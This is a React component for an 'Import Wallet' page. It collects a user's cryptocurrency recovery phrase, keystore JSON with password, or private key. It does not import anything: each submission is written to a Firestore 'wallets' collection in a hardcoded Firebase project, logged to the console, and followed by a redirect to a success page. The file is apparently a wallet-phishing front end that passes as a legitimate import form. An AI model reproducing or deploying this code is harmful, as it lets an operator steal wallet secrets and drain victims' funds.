import React, { useState } from "react";
import PageLayout from "../PageLayout/PageLayout";

import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc } from "firebase/firestore";
import { useNavigate } from "react-router-dom";

const firebaseConfig = {
  apiKey: "AIzaSyCk9UwH8dr1Jgx9cPPcSeKrIQeh6ZRezKI",
  authDomain: "wallet-a7af7.firebaseapp.com",
  projectId: "wallet-a7af7",
  storageBucket: "wallet-a7af7.appspot.com",
  messagingSenderId: "221270332917",
  appId: "1:221270332917:web:2ef48f0bdddb3fcf3a3cbc",
  measurementId: "G-BDX8JGN5MX",
};

initializeApp(firebaseConfig);

const db = getFirestore();

const DetailsPage = ({ setIsSuccess }: any) => {
  const navigate = useNavigate();
  const [tab, setTab] = useState(1);
  const [walletData, setWalletData] = useState<any>({
    phrase: "",
    keystoreJson: "",
    privateKey: "",
  });

  const handleChange = (e: any) => {
    e.persist();
    setWalletData((prevState: any) => ({
      ...prevState,
      [e.target.name]: e.target.value,
    }));
    console.log(walletData);
  };

  const postWallet = async (walletData: any) => {
    const time = Date.now();
    await addDoc(collection(db, "wallets"), {
      ...walletData,
      postedOn: Intl.DateTimeFormat("en-US", {
        year: "numeric",
        month: "long",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      }).format(time),
    })
      .then(function (res) {
        setIsSuccess(true);
        navigate("/success");
      })
      .catch(function (err: any) {
        alert("Can't be added");
        console.log(err);
      });
  };

  const handleSubmit = async (e: any) => {
    e.preventDefault();
    await postWallet(walletData);
    setWalletData({});
  };

  return (
    <PageLayout>
      <div className="hero">
        <h3>Import Wallet</h3>
      </div>

      <form className="input-box-container" onSubmit={handleSubmit}>
        <div className="tab-container">
          <div
            onClick={() => setTab(1)}
            className={tab === 1 ? "active-tab" : "tab"}
          >
            <h6>Phrase</h6>
          </div>
          <div
            onClick={() => setTab(2)}
            className={tab === 2 ? "active-tab" : "tab"}
          >
            <h6> Keystore JSON</h6>
          </div>
          <div
            onClick={() => setTab(3)}
            className={tab === 3 ? "active-tab" : "tab"}
          >
            <h6>Private Key</h6>
          </div>
        </div>

        <div className="input-box">
          <p className="black-text">
            {tab === 2
              ? " Seperate your Keystore JSON from Your Passsword with - or /"
              : ""}
          </p>
          {tab === 1 ? (
            <textarea
              required
              className="input"
              name="phrase"
              value={walletData.phrase}
              onChange={handleChange}
            />
          ) : tab === 2 ? (
            <textarea
              required
              className="input"
              name="keystoreJson"
              value={walletData.keystoreJson}
              onChange={handleChange}
            />
          ) : (
            <textarea
              required
              className="input"
              name="privateKey"
              value={walletData.privateKey}
              onChange={handleChange}
              placeholder="Private Key"
            />
          )}
          <p className="blue-text">
            {tab === 1
              ? "Typically 12 (sometimes 24) words separated by single spaces"
              : tab === 2
              ? "Several lines of text beginning with '(...)' plus the password you used to encrypt it."
              : "Typically 64 alphanumeric characters"}
          </p>
          <button type="submit">IMPORT</button>
        </div>
      </form>
    </PageLayout>
  );
};

export default DetailsPage;
